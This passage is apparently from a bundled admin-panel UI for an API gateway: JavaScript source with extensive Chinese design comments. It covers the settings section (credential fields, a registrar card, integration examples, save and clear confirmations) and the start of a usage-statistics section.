degraded ? \"\" : \"none\";\n\n  // 装载不起来时：一条横幅 + 逐条列出缺什么。**表单仍然可编辑**（见 renderOne）。\n  const blocked = loadBlockedRows(data);\n  nodes.blocked.textContent = \"\";\n  nodes.blocked.style.display = blocked.length === 0 ? \"none\" : \"\";\n  if (blocked.length > 0) {\n    nodes.blocked.appendChild(elI18n(\"p\", \"set.loadBlocked\"));\n    for (const r of blocked) {\n      const label = nodes.fields[r.field] === undefined ? r.field : t(fieldLabelKey(r.field));\n      // 表外的码**原样显示出来**，不冒充任何一档已知原因。\n      const text = r.key === null ? t(\"set.err.unknown\", { code: r.code }) : t(r.key, r.params);\n      nodes.blocked.appendChild(el(\"p\", null, `${label}: ${text}`));\n      if (nodes.fields[r.field] !== undefined) nodes.fields[r.field].wrap.classList.add(\"invalid\");\n    }\n  }\n}\n\n/**\n * 第 4 张卡的卡内内容，整块重画。\n *\n * ── **本函数里没有任何一条端点路径、请求体形状或协议名** ──────────────────────\n * P3d 核心设计决定（全局约束 15）：四个消费者只许有一份「怎么调这个网关」的知识。\n * 协议 id 与展示名、方法、路径模板、鉴权头、最小请求体全部来自\n * `GET /admin/api/models` 的响应，拼代码那一步在 `admin-ui/js/pure/examples.mjs` 里；\n * 这里只负责选哪一档、把它画出来。\n * ⚠️ `api.get(\"/models\")` 这条 **admin** 路径不算第二份端点知识，边界与\n * `admin-ui/js/sec-models.js` 文件头「`api.get(\"/models\")` 这条 admin 路径为什么不算\n * 第二份端点知识」那一段逐字相同。\n *\n * ⚠️ **代码块一律 `textContent`**：示例里全是引号与花括号，而 CSP 的 `script-src 'self'`\n * 要求零内联脚本（`src/ui/serve.ts`）。`el()` 走的就是 `textContent`。\n *\n * ⚠️ **「一条协议都没有」在这张卡上折进「读不出来」那一档，这是明写的取舍**：\n * 真源里那份协议清单是模块级常量、今天恒有四条，响应里它变成空数组只可能意味着\n * 这份响应被改过——那正是「读不出来」本身。别把这条推广到别的板块（模型板块的\n * 「一个模型都没有」是真会发生的一档，它在那里单独有话说）。\n */\nfunction renderExamples() {\n  const host = nodes.examples;\n  host.textContent = \"\";\n  if (exCatalog === null || exCatalog.protocols.length === 0) {\n    host.appendChild(elI18n(\"p\", \"set.examples.unavailable\", { class: \"danger-text\" }));\n    return;\n  }\n  // 占位口令的取值来自纯函数模块，**不在文案里再抄一份**。\n  host.appendChild(el(\"p\", { class: \"muted note\" }, t(\"set.examples.desc\", { key: KEY_PLACEHOLDER })));\n\n  const rows = allExamples(exCatalog.protocols, exCatalog.models, exOrigin);\n  // 选中的协议不在这份目录里（第一次渲染，或目录变了）⇒ 落到真源给的第一条。\n  // **顺序照响应给的顺序，不在这里重排**——重排就是又一份知识。\n  if (!rows.some((r) => r.protocol === exProto)) exProto = exCatalog.protocols[0].id;\n\n  const protoBar = el(\"div\", { class: \"btn-group examples-bar\" });\n  protoBar.appendChild(elI18n(\"span\", \"set.examples.proto\", { class: \"muted\" }));\n  for (const p of exCatalog.protocols) {\n    // 展示名走响应里的 `label`（协议的专名，刻意不进 i18n）。三条都不许走：\n    // 本地再写一张映射、把 id 拼进一个 i18n key、直接渲染裸 id。\n    const btn = el(\"button\", { type: \"button\", class: \"btn-toggle\", \"data-ex-protocol\": p.id }, p.label);\n    btn.classList.toggle(\"active\", exProto === p.id);\n    btn.addEventListener(\"click\", () => { if (exProto !== p.id) { exProto = p.id; renderExamples(); } });\n    protoBar.appendChild(btn);\n  }\n  host.appendChild(protoBar);\n\n  const langBar = el(\"div\", { class: \"btn-group examples-bar\" });\n  langBar.appendChild(elI18n(\"span\", \"set.examples.lang\", { class: \"muted\" }));\n  for (const lang of EXAMPLE_LANGS) {\n    // 表外的语言**照实显示原值**，不冒充任何一档已知语言（`langLabel()` fail-open）。\n    const label = langLabel(lang);\n    const btn = el(\"button\", { type: \"button\", class: \"btn-toggle\", \"data-ex-lang\": lang }, label === null ? lang : label);\n    btn.classList.toggle(\"active\", exLang === lang);\n    btn.addEventListener(\"click\", () => { if (exLang !== lang) { exLang = lang; renderExamples(); } });\n    langBar.appendChild(btn);\n  }\n  host.appendChild(langBar);\n\n  const row = rows.find((r) => r.protocol === exProto && r.lang === exLang);\n  // ⚠️ **`code === null` 绝不能退化成「照拼一段」**：那一档的意思是「这条协议的路径要一个\n  //    模型，而目录里没有任何模型支持它」，硬拼出来的是一条长得像真的、按着抄一定打不通的\n  //    地址。如实说这里没有示例。\n  if (row === undefined || row.code === null) {\n    host.appendChild(elI18n(\"p\", \"set.examples.noModel\", { class: \"muted note\" }));\n    return;\n  }\n  host.appendChild(el(\"pre\", { class: \"mono examples-code\" }, row.code));\n  const copyBtn = elI18n(\"button\", \"common.copy\", { type: \"button\", class: \"examples-copy\" });\n  copyBtn.addEventListener(\"click\", () => { copy(row.code); });\n  host.appendChild(copyBtn);\n}\n\n/**\n * 拉一次协议目录。**零存储读**（`src/http/admin/handlers/models.ts` 全部来自模块级常量），\n * 所以它不进配额账，也不违反本板块「没有自动刷新」那条纪律。\n *\n * ⚠️ **两个不同的失败落到同一档**：HTTP 失败（`api.get` 抛）与「读得回来但形状不对」\n * （窄化交出 `null`）在卡上都是「读不出来」。少了后一半的话，一份被中间件改过形状的响应\n * 会让这张卡画出一段**结构自洽而内容缺斤少两**的示例——而运维会照着它抄。\n *\n * ⚠️ **没有「再读一次」按钮，这是刻意的**：`exCatalog` 为 `null` 时每一次 `onShow()`\n * 都会重来一遍，切走再切回来就是重试入口。代价如实写：**停在设置页不动的话，这张卡\n * 不会自己好起来**。\n */\nasync function loadCatalog() {\n  if (exCatalog !== null) { renderExamples(); return; }\n  if (exInFlight) return;\n  exInFlight = true;\n  try {\n    const body = await api.get(\"/models\");\n    const protocols = exampleProtocols(body);\n    const models = catalogModels(body);\n    exCatalog = protocols === null || models === null ? null : { protocols, models };\n  } catch (e) {\n    exCatalog = null;\n  } finally {\n    exInFlight = false;\n  }\n  // ⚠️ **这里不判 `nodes !== null`，上面那条早退也不判——两条路径对同一个不变量\n  //    必须给出同一个表态**（P3d Task 7 评审 F-10：上一版一条判一条不判，\n  //    而「一处判空」会被下一个人读成「这里真的可能是 null」）。\n  //    不变量与它的出处：`loadCatalog()` 只有 `onShow()` 一个调用方，而\n  //    `admin-ui/js/app.js` 的 `showSection` 是**先 init 再 onShow**\n  //    （`if (!s.__inited) { s.init(...); s.__inited = true; } s.onShow && s.onShow();`），\n  //    而 `nodes = { fields: {} }` 是本板块 `init()` 里**紧跟在标题那两行之后**就执行的，\n  //    此后再没有任何地方把它写回 null。\n  //    ⚠️ 上一版这里写的是「`init()` 第一行」——不确切（前面还有清空 section 与加标题两行）。\n  //    一句不确切的位置描述会让下一个人去那一行找、找不到、然后不再信这一整段。\n  renderExamples();\n}\n\n/** 把上一次保存留下的高亮与错误全部清掉。**每次保存前都要清**，否则会越积越多。 */\nfunction clearMarks() {\n  for (const path of Object.keys(nodes.fields)) {\n    nodes.fields[path].wrap.classList.remove(\"changed\");\n    nodes.fields[path].wrap.classList.remove(\"invalid\");\n  }\n  nodes.errors.textContent = \"\";\n  nodes.errors.style.display = \"none\";\n  // ⚠️ **不清 `nodes.blocked`**：它讲的是「存储里那份配置现在装不装得起来」这个\n  // **当前状态**，不是上一次保存留下的痕迹；由 `render()` 按最新响应重算。\n  nodes.readback.textContent = \"\";\n  nodes.readback.style.display = \"none\";\n}\n\nfunction showErrors(rows) {\n  nodes.errors.textContent = \"\";\n  for (const r of rows) {\n    const line = el(\"p\");\n    const label = nodes.fields[r.field] === undefined ? r.field : t(fieldLabelKey(r.field));\n    // 表外的码**原样显示出来**，不冒充任何一档已知原因。\n    const text = r.key === null ? t(\"set.err.unknown\", { code: r.code }) : t(r.key, r.params);\n    line.textContent = `${label}: ${text}`;\n    nodes.errors.appendChild(line);\n    if (nodes.fields[r.field] !== undefined) nodes.fields[r.field].wrap.classList.add(\"invalid\");\n  }\n  nodes.errors.style.display = rows.length === 0 ? \"none\" : \"\";\n}\n\n// ───────────────────────────────────────────────────────────────────────────\n// 保存\n// ───────────────────────────────────────────────────────────────────────────\n\n/** 把当前表单读成 `{ 路径: 值 }`。下拉与开关也在这里归一。 */\nfunction readForm() {\n  const raw = {};\n  for (const path of Object.keys(nodes.fields)) {\n    const f = nodes.fields[path];\n    if (f.input.disabled) continue;\n    raw[path] = f.input.getAttribute(\"type\") === \"checkbox\" ? f.input.checked === true : f.input.value;\n  }\n  return raw;\n}\n\n/**\n * 保存。**这个函数的顺序就是设计 §5.3 那条产品不变式本身。**\n *\n * ⚠️⚠️ **`await api.put(...)` 之前不许出现任何成功迹象。**\n * 后端那一半是「响应体里没有任何一个『成功了』字段，只有回读出来的 `fields`」，\n * 前端这一半就是这个 `await` 的位置。挪到它前面 ⇒\n * `tests/ui/dom/settings-save.test.ts` 的\n * 「回读还没落定之前，界面上不许出现任何成功迹象」变红。\n */\nasync function save() {\n  clearMarks();\n  const raw = readForm();\n\n  // 前端只做四条最轻量的即时提示（设计 §10.4），其余全靠渲染后端错误码。\n  const local = localErrors(raw, data);\n  if (local.length > 0) {\n    showErrors(local.map((e) => ({ field: e.field, code: e.code, key: `set.err.${e.code}`, params: {} })));\n    return;\n  }\n\n  const patch = buildPatch(raw, data, touched);\n  if (Object.keys(patch).length === 0) {\n    // **不是成功，也不是失败**：一次「什么都没改」的保存要如实说出来，\n    // 弹一句「已保存」是这个面板最不该说的那句话。\n    toast(t(\"set.nothingToSave\"), \"warn\");\n    return;\n  }\n\n  nodes.save.disabled = true;\n  try {\n    // ★★ 这一行之前，界面上不许有任何「保存成功」的迹象。\n    const res = await api.put(\"/config\", { patch });\n    // ★★ 回读落定了，从这里开始才允许说话——而且**说的是回读结果本身**：\n    // 设计 §5.3 明令不弹「已保存并生效」，改成把变化的字段高亮 + 显示生效值。\n    data = res;\n    render();\n    const changed = changedFields(res);\n    const secrets = changedSecrets(res);\n    for (const path of changed) {\n      if (nodes.fields[path] !== undefined) nodes.fields[path].wrap.classList.add(\"changed\");\n    }\n    for (const path of secrets) {\n      if (nodes.fields[path] !== undefined) nodes.fields[path].wrap.classList.add(\"changed\");\n    }\n    nodes.readback.textContent = changed.length === 0 && secrets.length === 0\n      ? t(\"set.readback.none\")\n      : t(\"set.readback\", { count: String(changed.length + secrets.length) });\n    nodes.readback.style.display = \"\";\n  } catch (e) {\n    const rows = errorRows(e && e.body);\n    if (rows.length > 0) showErrors(rows);\n    else toast(t(\"set.saveFailed\"), \"warn\", { sticky: true });\n  } finally {\n    nodes.save.disabled = false;\n  }\n}\n\n/**\n * `agnesPlatformUrl` 的二次确认（设计 §8.6 第二行）。\n *\n * **它是注册凭据的去向**：改成自己的服务器就能收走每次注册的邮箱 + 密码 + 验证码。\n * 所以它折在「高级」折叠区里，改动它要单独确认一次——与主表单那颗保存按钮分开，\n * 免得一次普通的「调个超时」顺手把它一起改了。\n */\nfunction confirmAdvanced() {\n  const body = el(\"div\");\n  body.appendChild(elI18n(\"p\", \"set.advanced.warn\", { class: \"danger-text\" }));\n  openModal(\"set.advanced.confirmTitle\", body, [\n    { labelKey: \"common.cancel\" },\n    { labelKey: \"common.confirm\", danger: true, onClick: () => { save(); } },\n  ]);\n}\n\n/** 清空一把凭据的二次确认（设计 §8.6：清空只能走显式动作）。 */\nfunction confirmClear(path) {\n  const body = el(\"div\");\n  body.appendChild(el(\"p\", null, t(\"set.clear.warn\", { field: t(fieldLabelKey(path)) })));\n  // **按状态分岔的那一句**，取值决策全在 `clearWarning()` 里（含红不红）。\n  // 同一句通用红字在这几种状态下有的是救命、有的是吓人，而面板手上有分辨它们的数据。\n  const effect = clearWarning(data, path);\n  body.appendChild(elI18n(\"p\", effect.key, { class: effect.kind === \"danger\" ? \"danger-text\" : \"muted note\" }));\n  openModal(\"set.clear.title\", body, [\n    { labelKey: \"common.cancel\" },\n    { labelKey: \"common.confirm\", danger: true, onClick: () => { doClear(path); } },\n  ]);\n}\n\nasync function doClear(path) {\n  try {\n    const res = await api.post(\"/config/secrets/clear\", { path });\n    const view = clearResultView(res);\n    // **回读之后**才刷界面（与 `save()` 同一条纪律）。\n    if (view.gatewayTokenMissing === true) {\n      toast(t(\"set.clear.gatewayMissing\"), \"warn\", { sticky: true });\n      load();\n      return;\n    }\n    if (isDiagnostic(res)) {\n      // 清完之后这份配置装载不起来了：**如实显示诊断视图**（横幅 + 逐条缺什么），\n      // 表单仍然可编辑，运维就地改完保存即可恢复。\n      data = res;\n      render();\n      return;\n    }\n    data = res;\n    render();\n    toast(t(\"set.clear.done\", { field: t(fieldLabelKey(path)) }), \"ok\");\n  } catch (e) {\n    toast(t(\"set.saveFailed\"), \"warn\", { sticky: true });\n  }\n}\n\nasync function load() {\n  if (abort) abort.abort();\n  abort = new AbortController();\n  try {\n    data = await api.get(\"/config\", { signal: abort.signal });\n  } catch (e) {\n    if (e && e.name === \"AbortError\") return;\n    // **不伪造上一次的数据**：读失败就清空，不留着旧值假装它是新的。\n    data = null;\n  }\n  // 与 `loadCatalog()` 结尾同一条裁定：**不判 `nodes !== null`。**\n  // ⚠️ 上一版这里判、那边不判，而两个函数是同一个 `onShow()` 里的兄弟调用、\n  //    读的是同一个变量（P3d Task 7 定向复评 M-4：我上一轮只修了一半，\n  //    新写的那句「一处判空会被下一个人读成这里真的可能是 null」在自己上方十行处被反证）。\n  //    不变量与出处见 `loadCatalog()` 结尾那一段。\n  render();\n}\n\nexport const settingsSection = {\n  init(section) {\n    section.textContent = \"\";\n    section.appendChild(elI18n(\"h2\", \"set.title\"));\n    nodes = { fields: {} };\n\n    const bar = el(\"div\", { class: \"toolbar\" });\n    const refresh = elI18n(\"button\", \"common.refresh\", { type: \"button\" });\n    refresh.addEventListener(\"click\", () => { load(); });\n    bar.appendChild(refresh);\n    const save0 = elI18n(\"button\", \"set.save\", { type: \"button\", class: \"cfg-save\" });\n    save0.addEventListener(\"click\", () => { save(); });\n    bar.appendChild(save0);\n    nodes.save = save0;\n    section.appendChild(bar);\n\n    const degraded = elI18n(\"p\", \"set.degraded\", { class: \"danger-text\" });\n    degraded.style.display = \"none\";\n    section.appendChild(degraded);\n    nodes.degraded = degraded;\n\n    // ── 卡 1：认证密钥 ──────────────────────────────────────────────────────\n    const auth = card(\"set.card.auth\");\n    for (const path of CARD_AUTH) addField(auth.body, path, \"secret\");\n    // 管理员口令**只读展示**（设计 §8.1 规则 2 / §10.4 卡 1）：它只从环境变量来，\n    // 面板不该能改自己的钥匙，所以这里连输入框都不给。\n    auth.body.appendChild(elI18n(\"p\", \"set.adminTokenNote\", { class: \"muted note\" }));\n    section.appendChild(auth.wrap);\n\n    // ── 卡 2：上游与冷却 ────────────────────────────────────────────────────\n    const upstream = card(\"set.card.upstream\");\n    for (const path of CARD_UPSTREAM) addField(upstream.body, path, \"text\");\n    section.appendChild(upstream.wrap);\n\n    // ── 卡 3：注册机（两张平级子卡 + 高级折叠区）──────────────────────────────\n    const reg = card(\"set.card.registrar\");\n    for (const path of CARD_REGISTRAR) {\n      const kind = path === \"registrar.enabled\"\n        ? \"toggle\"\n        : ((path === \"registrar.primary\" || path === \"registrar.fallback\") ? \"select\" : \"text\");\n      addField(reg.body, path, kind);\n    }\n\n    reg.body.appendChild(elI18n(\"p\", \"reg.emptyPrimary\", { class: \"muted note\" }));\n    const channelRow = el(\"div\", { class: \"card-row\" });\n    // **顺序取自 `CHANNELS`**（字母序），两张子卡由同一段代码建出来 ⇒\n    // 「完全对称」在结构上就是不可表达的例外（设计 §10.3 第 2 条）。\n    for (const channel of CHANNELS) {\n      const sub = el(\"div\", { class: \"card channel-card\", \"data-channel\": channel });\n      sub.appendChild(elI18n(\"div\", channelLabelKey(channel), { class: \"label channel-name\" }));\n      for (const path of channelFields(channel)) {\n        addField(sub, path, isSecretPath(path) ? \"secret\" : \"text\");\n      }\n      // 两条通道之间**唯一**的不对称，且它是同一个字段位置上的两句事实。\n      sub.appendChild(elI18n(\"p\", channelAddressFactKey(channel), { class: \"muted note\" }));\n      channelRow.appendChild(sub);\n    }\n    reg.body.appendChild(channelRow);\n\n    // 高级折叠区：`agnesPlatformUrl` 单独放这里 + 红色警告 + 自己的二次确认按钮。\n    const advanced = el(\"details\", { class: \"cfg-advanced\" });\n    advanced.appendChild(elI18n(\"summary\", \"set.advanced.title\"));\n    advanced.appendChild(elI18n(\"p\", \"set.advanced.warn\", { class: \"danger-text\" }));\n    for (const path of ADVANCED_FIELDS) addField(advanced, path, \"text\");\n    const advSave = elI18n(\"button\", \"set.advanced.save\", { type: \"button\", class: \"cfg-advanced-save danger\" });\n    advSave.addEventListener(\"click\", () => { confirmAdvanced(); });\n    advanced.appendChild(advSave);\n    reg.body.appendChild(advanced);\n    section.appendChild(reg.wrap);\n\n    // ── 卡 4：集成示例（P3d Task 7，设计 §10.4 第 4 张卡）──────────────────────\n    // 板块文件允许碰浏览器全局，**base URL 在这里读一次再传给纯函数**——\n    // `js/pure/` 下禁止出现浏览器那两个顶层全局（`scripts/build-ui.mjs` 的静态校验，\n    // 含注释里的字样），所以纯函数只收一个 `origin` 参数。\n    // ⚠️ **第 5 张卡（危险区）是 P3e 的**，设计订正 D1 把它移过去的理由是\n    // 「重置到底重置了什么本身需要一节设计，而设计文档没有这一节」。别在这里顺手做。\n    const examples = card(\"set.card.examples\");\n    exOrigin = location.origin;\n    nodes.examples = examples.body;\n    section.appendChild(examples.wrap);\n\n    const blocked = el(\"div\", { class: \"cfg-blocked danger-text\" });\n    blocked.style.display = \"none\";\n    section.appendChild(blocked);\n    nodes.blocked = blocked;\n\n    const errors = el(\"div\", { class: \"cfg-errors danger-text\" });\n    errors.style.display = \"none\";\n    section.appendChild(errors);\n    nodes.errors = errors;\n\n    const readback = el(\"p\", { class: \"muted note cfg-readback\" });\n    readback.style.display = \"none\";\n    section.appendChild(readback);\n    nodes.readback = readback;\n\n    const propagation = el(\"p\", { class: \"muted note\" });\n    section.appendChild(propagation);\n    nodes.propagation = propagation;\n  },\n\n  onShow() {\n    load();\n    // 目录是静态的：成功读过一次之后这一步只重画（切语言时框架层会重跑 onShow，\n    // 而集成示例卡那段说明带插值参数，`apply(document)` 刷不动它，必须重画）。\n    loadCatalog();\n  },\n\n  onHide() {\n    // **作废在飞请求**：不作废的话切回来时旧响应可能盖掉新数据（板块契约 §9.3）。\n    if (abort) { abort.abort(); abort = null; }\n  },\n};\n\n/**\n * 这条路径是不是凭据。\n *\n * ⚠️ **`init()` 跑在第一次 `load()` 之前，那时 `data` 还是 `null`**，\n * `isSecret(data, path)` 一律回 `false` ⇒ 两条通道的 `apiKey` 会被建成明文文本框。\n * 所以建控件这一步用路径形状判，**而运行期的那份判据仍然走后端给的 `secrets` 清单**\n *（`buildPatch` / `renderOne` 都走 `isSecret`）。两处判据不一致时以后端那份为准，\n * 这里只影响「这个框是不是 password 类型」。\n */\nfunction isSecretPath(path) {\n  return path.endsWith(\".apiKey\") || path === \"gatewayToken\";\n}\n", type: "text/javascript; charset=utf-8", etag: "\"546540ff12d1b116\"" },
  "/admin/js/sec-usage.js": { body: "/**\n * 用量板块（设计文档 §10.6）：\n * 6 张汇总卡 + 时间范围按钮组 + 日汇总表 + 点某天下钻到「小时 / 模型 / 协议」三张表。\n *\n * 板块契约（设计文档 §9.3）：`{ init?, onShow?, onHide? }`，见 admin-ui/js/app.js\n * 的 showSection。**板块内不许监听 langchange**——框架层会 apply(document) 之后\n * 重跑一次 onShow()。\n *\n * 三条纪律：①一切来自接口的内容一律 textContent（`byModel` 的键来自客户端填的\n * 模型名，完全不可信）；②**取值决策一律不写在这里**，全在 `js/pure/usage.mjs` 里\n * （admin-ui/README.md 硬规则 1），四态判定由 `tests/ui/usage.test.ts` 的\n * 「四种状态互不重叠 —— 『没开』『读不出来』『真的是 0』『有数据』揉在一起就是撒谎」\n * 那一格钉着；③**一切形态分支只读接口返回的字段**，不许自己嗅探运行时（全局约束 1）。\n *\n * ── **本板块不轮询** ────────────────────────────────────────────────────────\n * 每刷新一次要付「天数 × 分片槽位」次存储读，而配额账把面板的读算成\n *「人点一下才发生」。刷新是手动的 + 切时间范围时。`onHide()` 停掉在飞请求。\n *\n * ── 「统计开没开」只读一个出口 ─────────────────────────────────────────────\n * `GET /admin/api/capabilities` 的 `stats.tier2Enabled` 与 `GET /admin/api/usage`\n * 的 `tier` 说的是同一件事，由 `tests/contract/admin-usage.test.ts` 的\n * 「capabilities 的 tier2Enabled 与 usage 的 tier 说的是同一件事 —— 两边不许分叉」\n * 那一格钉着。**本板块只读后者**（经 `usageState()`）：两个出口都读的话，\n * 面板就要面对「它们不一致时听谁的」这个不该存在的问题，而那正是本期核心\n * 设计决定（同一份知识只许有一份）在这个板块的落点。\n * `capabilities` 在这里只提供两个**数字**：落盘间隔与 token 覆盖到的协议 id。\n */\nimport { api } from \"./api.js\";\nimport { t } from \"./i18n.js\";\nimport { el, elI18n } from \"./ui.js\";\nimport { fmtCount, fmtDash, fmtDuration, fmtInstant, fmtPercent } from \"./pure/format.mjs\";\nimport { offsetMs } from \"./pure/overview.mjs\";\nimport {\n  RANGES, DEFAULT_RANGE, rangeLabelKey, rangeToQuery,\n  usageState, detailState, rowState, readSucceeded, summaryCards, bucketCells,\n  malformedKind, usageNoteKey, noteSeverity,\n  dayRows, breakdownRows, tokensCoverageLabels, pendingTail, cellKind, ratioKind,\n} from \"./pure/usage.mjs\";\n\n/**\n * EN DASH（U+2013）。**与 `fmtDash(null)` 交出来的 EM DASH（U+2014）是两个记号，\n * 说的是两件事**：这一根是「读成功了，只是没有样本」，那一根是「我们不知道」。\n * **哪一格用哪一根由 `pure/usage.mjs` 的 `cellKind` / `ratioKind` 决定**，\n * 这里只负责把它画出来——让板块文件自己目测就等于把三态判定抄回了 DOM 代码。\n */\nconst EN_DASH = \"–\";\n\nlet nodes = null;\nlet abort = null;\n/**\n * 在飞请求的世代号。**`AbortController` 一个人守不住这件事**：\n * `fetch` 的 abort 在真实浏览器里是异步的，而 DOM 用例里那个 `fetch` 替身\n *（`tests/ui/dom/harness.ts` 的 `bootPanel()` 用 `vi.stubGlobal(\"fetch\", …)` 装的那一个）\n * **压根不看 signal** ⇒ 只靠 `e.name === \"AbortError\"` 分支的话，\n * 「切走再回来，上一次的响应把新数据覆盖掉」这件事**在两种环境里都可能发生，\n * 而在测试里恒不可观测**（第 8 / 第 9 两种假阳性合起来的形态）。\n * 世代号是同步的、两种环境里行为逐字相同，由\n * `tests/ui/dom/usage-section.test.ts` 的\n * 「切走板块时在飞请求被作废 —— 回来时不会被上一次的响应覆盖」那一格钉着。\n */\nlet seq = 0;\n/** 下钻的世代号。**与 `seq` 分开**，理由见 `openDay()` 上方那段。 */\nlet detailSeq = 0;\n/**\n * 板块现在是不是显示着。**`loadStatic()` 那条链唯一的作废判据**（评审 M5）：\n * 它不经 `load()`，所以拿不到世代号；切走之后它回来重绘一个不可见的板块，\n * 今天没有用户可见的后果，但那是「一条没有作废条件的异步链」——\n * 本板块另外两条都有，这一条没有理由是例外。\n */\nlet shown = false;\n/** 最近一次成功的 `/usage` 响应；`null` = 还没有过一次成功（或上一次失败了）。 */\nlet data = null;\n/** `/capabilities` 与 `/models` 各拉一次（都是零存储读的静态数据）。 */\nlet caps = null;\nlet catalog = null;\nlet range = DEFAULT_RANGE;\n/** 当前展开的那一天（`YYYY-MM-DD`）与它的响应。`null` = 没有展开任何一天。 */\nlet detailDate = null;\nlet detailData = null;\nlet detailFailed = false;\n\n/** 建一张 `.card`：标签 + 值。值那一格由调用方之后自己填。 */\nfunction tile(labelKey, tipKey, tipParams) {\n  const card = el(\"div\", { class: \"card\" });\n  const label = elI18n(\"div\", labelKey, { class: \"label\" });\n  if (tipKey !== undefined && tipKey !== null) {\n    label.setAttribute(\"title\", tipParams === undefined ? t(tipKey) : t(tipKey, tipParams));\n  }\n  card.appendChild(label);\n  const value = el(\"div\", { class: \"value\" });\n  card.appendChild(value);\n  return { card, value };\n}\n\n/** 一个内容块：标题 + 空的 body 容器。 */\nfunction block(titleKey) {\n  const wrap = el(\"div\", { class: \"card block\" });\n  // **标题节点要交出去**：`≈` 得真的挂在标题上，而不是挂在整张表下面\n  //（P3d Task 5 收口复评 G2：上一版 append 到 `wrap` ⇒ 子节点序是\n  // `h3, div, span.approx`，`≈` 落在表格**下面**，与注释和用例名都对不上，\n  // 而用例只数个数 ⇒ 改 append 目标那一行**不会红**）。\n  const head = elI18n(\"h3\", titleKey);\n  wrap.appendChild(head);\n  const body = el(\"div\");\n  wrap.appendChild(body);\n  return { wrap, body, head };\n}\n\n/**\n * `≈` 标记的 tooltip。**落盘间隔这个数从 `capabilities` 取，不在前端算死**\n *（全局约束 10：诚实标记由后端字段驱动；写死会在改后端常量的那天变成一句假话）。\n * 拿不到 capabilities 时换一句**不带那个数**的话，而不是编一个缺省值。\n */\nfunction approxTitle() {\n  const ms = caps && caps.stats && typeof caps.stats.flushIntervalMs === \"number\"\n    && Number.isFinite(caps.stats.flushIntervalMs) ? caps.stats.flushIntervalMs : null;\n  return ms === null ? t(\"usage.approxTipUnknown\") : t(\"usage.approxTip\", { flush: fmtDuration(ms) });\n}\n\n/**\n * 把一个数字格填成三态里的一种。\n *\n * `kind` 来自 `cellKind` / `ratioKind`，**不是这里判的**：\n * · `\"value\"` —— 那个数字（可能带 `≈` 与「不完整」两个前缀标记）；\n * · `\"none\"`  —— EN DASH，「读成功了，这段时间没有样本」；\n * · `\"unknown\"` —— `fmtDash(null)` 的 EM DASH，「我们不知道」。\n *\n * ⚠️ **计数类在 `empty` 态拿到的 `kind` 是 `\"value\"`、值是 `0`** ——那一格就该写 `0`。\n * 把真零画成破折号是**反向的撒谎**，与「接口失败伪造 0」同样严重、方向相反。\n */\nfunction fillCell(node, kind, text, marks) {\n  node.textContent = \"\";\n  if (kind === \"unknown\") {\n    node.appendChild(el(\"span\", { class: \"usage-unknown\", title: t(\"usage.cell.unknownTip\") }, fmtDash(null)));\n    return;\n  }\n  if (kind === \"none\") {\n    node.appendChild(el(\"span\", { class: \"usage-none\", title: t(\"usage.cell.noneTip\") }, EN_DASH));\n    return;\n  }\n  if (marks && marks.approx) {\n    node.appendChild(el(\"span\", { class: \"approx\", title: approxTitle() }, \"≈ \"));\n  }\n  if (marks && marks.incompleteOf !== null && marks.incompleteOf !== undefined) {\n    const warn = el(\"span\", { class: \"usage-incomplete\" }, `${t(\"usage.incomplete\")} `);\n    warn.setAttribute(\"title\", t(\"usage.incompleteTip\", { malformed: fmtCount(marks.incompleteOf) }));\n    node.appendChild(warn);\n  }\n  node.appendChild(el(\"span\", null, text));\n}\n\n/**\n * Tier-2 关闭时的说明卡。**一个数字格都不渲染**（设计 §10.6：不画空图表）——\n * 一张全是 0 的表会被读成「这段时间没人用」，而事实是这个部署根本没在记账。\n *\n * ⚠️⚠️ **设计 §10.6 的原话是「一张说明卡 +『开启时间序列统计』按钮（跳设置页）」，\n * 而这里刻意没有那颗按钮，理由是它会把运维送到一个没有这个开关的页面上**：\n * `usageStatsEnabled` **今天不在 `EDITABLE` 里**，`src/core/config.ts` 的\n * `usageStatsEnabled` 字段上方逐字写着「不进 `EDITABLE`，是因为设置页本期没有\n * 它的入口——进了就会得到一份『说能改、却没有任何地方能改』的字段清单」，\n * 而 `admin-ui/js/pure/settings.mjs` 的三张卡（`CARD_AUTH` / `CARD_UPSTREAM` /\n * `CARD_REGISTRAR`）里确实一格都没有它。\n * ⇒ 那颗按钮会是本仓反复裁过的同一个形态：**面板说一件事、实际是另一件事**。\n * 换成写清「怎么开」——环境变量 + 重启，那是今天唯一真的能开它的路径。\n * **这条偏离是刻意的，登记在 P3d Task 5 的报告里。**\n */\nfunction buildOffCard() {\n  const { wrap, body } = block(\"usage.off.title\");\n  body.appendChild(elI18n(\"p\", \"usage.off.body\"));\n  body.appendChild(elI18n(\"p\", \"usage.off.howto\"));\n  const cost = el(\"p\", { class: \"muted note\" });\n  const ms = caps && caps.stats && typeof caps.stats.flushIntervalMs === \"number\"\n    && Number.isFinite(caps.stats.flushIntervalMs) ? caps.stats.flushIntervalMs : null;\n  // ⚠️ 那个开销数字**来自 capabilities**，不在前端算死（设计 §10.6 + 全局约束 10）。\n  cost.textContent = ms === null ? t(\"usage.off.costUnknown\") : t(\"usage.off.cost\", { flush: fmtDuration(ms) });\n  body.appendChild(cost);\n  body.appendChild(elI18n(\"p\", \"usage.off.tier1\", { class: \"muted note\" }));\n  return wrap;\n}\n\n/**\n * 时间范围按钮组 + 覆盖区间 + 30 天那一档的保留期说明。\n *\n * 按钮组**复用事件板块那套 `.btn-group` / `.btn-toggle`**，不新起一套 class：\n * 两个板块的这个控件在交互与外观上是同一件东西，各写一份迟早长得不一样。\n */\nfunction buildRangeBar() {\n  const wrap = el(\"div\");\n  const bar = el(\"div\", { class: \"btn-group\" });\n  bar.appendChild(elI18n(\"span\", \"usage.rangeLabel\", { class: \"muted\" }));\n  for (const r of RANGES) {\n    const key = rangeLabelKey(r);\n    // 表外的档位不该存在（`RANGES` 与 `rangeLabelKey` 同一个文件），\n    // 但真出现时**把原值照实显示出来**，不冒充任何一档已知档位。\n    const btn = key === null\n      ? el(\"button\", { type: \"button\", class: \"btn-toggle\", \"data-range\": r }, r)\n      : elI18n(\"button\", key, { type: \"button\", class: \"btn-toggle\", \"data-range\": r });\n    btn.classList.toggle(\"active\", r === range);\n    btn.addEventListener(\"click\", () => {\n      if (range === r) return;\n      range = r;\n      // 换档位就换了一段区间，上一天的下钻不再属于这一段 —— 连同它在飞的那份一起作废。\n      detailDate = null;\n      detailData = null;\n      detailFailed = false;\n      detailSeq++;\n      load();\n    });\n    bar.appendChild(btn);\n  }\n  wrap.appendChild(bar);\n\n  // **渲染服务端回读的 